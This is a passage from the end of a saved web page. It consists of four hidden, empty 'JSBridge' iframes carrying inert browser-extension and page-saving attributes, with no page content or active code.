        srcdoc='<html><head><script data-savepage-type="" type="text/plain" ecommerce-type="extend-native-history-api"></script><script data-savepage-type="" type="text/plain"></script>
<style id="savepage-cssvariables">
  :root {
  }
</style>
      </head><body bis_status="ok" bis_frame_id="69"></body></html>'
        data-savepage-sameorigin=""
        id="__JSBridgeIframe_1.0__"
        title="jsbridge___JSBridgeIframe_1.0__"
        style="display: none;"
        data-savepage-key="0-3"
    ></iframe>
    <iframe
        srcdoc='<html><head><script data-savepage-type="" type="text/plain" ecommerce-type="extend-native-history-api"></script><script data-savepage-type="" type="text/plain"></script>
<style id="savepage-cssvariables">
  :root {
  }
</style>
      </head><body bis_status="ok" bis_frame_id="70"></body></html>'
        data-savepage-sameorigin=""
        id="__JSBridgeIframe_SetResult_1.0__"
        title="jsbridge___JSBridgeIframe_SetResult_1.0__"
        style="display: none;"
        data-savepage-key="0-4"
    ></iframe>
    <iframe
        srcdoc='<html><head><script data-savepage-type="" type="text/plain" ecommerce-type="extend-native-history-api"></script><script data-savepage-type="" type="text/plain"></script>
<style id="savepage-cssvariables">
  :root {
  }
</style>
      </head><body bis_status="ok" bis_frame_id="71"></body></html>'
        data-savepage-sameorigin=""
        id="__JSBridgeIframe__"
        title="jsbridge___JSBridgeIframe__"
        style="display: none;"
        data-savepage-key="0-5"
    ></iframe>
    <iframe
        srcdoc='<html><head><script data-savepage-type="" type="text/plain" ecommerce-type="extend-native-history-api"></script><script data-savepage-type="" type="text/plain"></script>
<style id="savepage-cssvariables">
  :root {
  }
</style>
      </head><body bis_status="ok" bis_frame_id="72"></body></html>'
        data-savepage-sameorigin=""
        id="__JSBridgeIframe_SetResult__"
        title="jsbridge___JSBridgeIframe_SetResult__"
        style="display: none;"
        data-savepage-key="0-6"
    ></iframe>
</html>
